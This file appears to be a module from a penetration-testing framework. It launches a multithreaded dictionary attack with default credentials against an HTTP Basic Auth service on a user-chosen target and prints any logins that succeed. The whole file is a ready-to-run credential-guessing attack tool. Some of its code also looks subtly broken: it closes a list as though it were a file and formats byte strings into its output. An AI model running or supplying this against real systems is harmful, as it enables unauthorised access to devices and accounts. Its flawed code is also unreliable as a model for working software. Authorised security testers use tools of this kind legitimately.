import threading

import Base.Threads as Threads
import Base.Validators as Validators
import Wordlists
from Base.Exploits import Exploit, Option
from Utils import multi, print_error, print_success, print_status, print_table, http_request


class Exploit(Exploit):
    """
    Module perform dictionary attack with default credentials against HTTP Basic Auth service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'credentials/http/basic_default',
        'display_name': 'HTTP Basic Default Credentials',
        'description': 'Module perform dictionary attack with default credentials against HTTP Basic Auth service. '
                       'If valid credentials are found, they are displayed to the user.',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',
            'D0ubl3G <d0ubl3g[at]protonmail.com>',
        ],
        'references': [
            'https://github.com/dark-lbp/isf',
        ],
        'devices': [
            'Multi',
        ],
    }

    target = Option('', 'Target IP address or file with target:port (file://)')
    port = Option(80, 'Target port')
    threads = Option(8, 'Number of threads')
    defaults = Option(Wordlists.defaults, 'User:Pass or file with default credentials (file://)')
    path = Option('/', 'URL Path')
    verbosity = Option(True, 'Display authentication attempts', validators=Validators.boolify)
    stop_on_success = Option(True, 'Stop on first valid authentication attempt', validators=Validators.boolify)

    credentials = []

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        url = "{}:{}{}".format(self.target, self.port, self.path)

        response = http_request("GET", url)
        if response is None:
            return

        if response.status_code != 401:
            print_status("Target is not protected by Basic Auth")
            return

        if self.defaults.startswith('file://'):
            defaults = open(self.defaults[7:], 'r')
        else:
            defaults = [self.defaults]

        with Threads.ThreadPoolExecutor(self.threads) as executor:
            for record in defaults:
                username, password = record.split(':')
                executor.submit(self.target_function, url, username, password)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

        defaults.close()

    def target_function(self, url, user, password):
        name = threading.current_thread().name

        user = user.encode('utf-8').strip()
        password = password.encode('utf-8').strip()

        response = http_request(method="GET", url=url, auth=(user, password))

        if response is not None and response.status_code != 401:
            print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'"
                          .format(self.target, self.port, name, user, password), verbose=self.verbosity)
            self.credentials.append((self.target, self.port, user, password))
            if self.stop_on_success:
                raise Threads.StopThreadPoolExecutor
        else:
            print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'"
                        .format(self.target, self.port, name, user, password), verbose=self.verbosity)
